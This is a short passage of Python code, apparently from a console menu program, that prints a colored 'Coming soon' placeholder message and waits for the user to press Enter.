        print(f"{Fore.YELLOW}[!] Coming soon{Style.RESET_ALL}")
        self.ui.press_enter()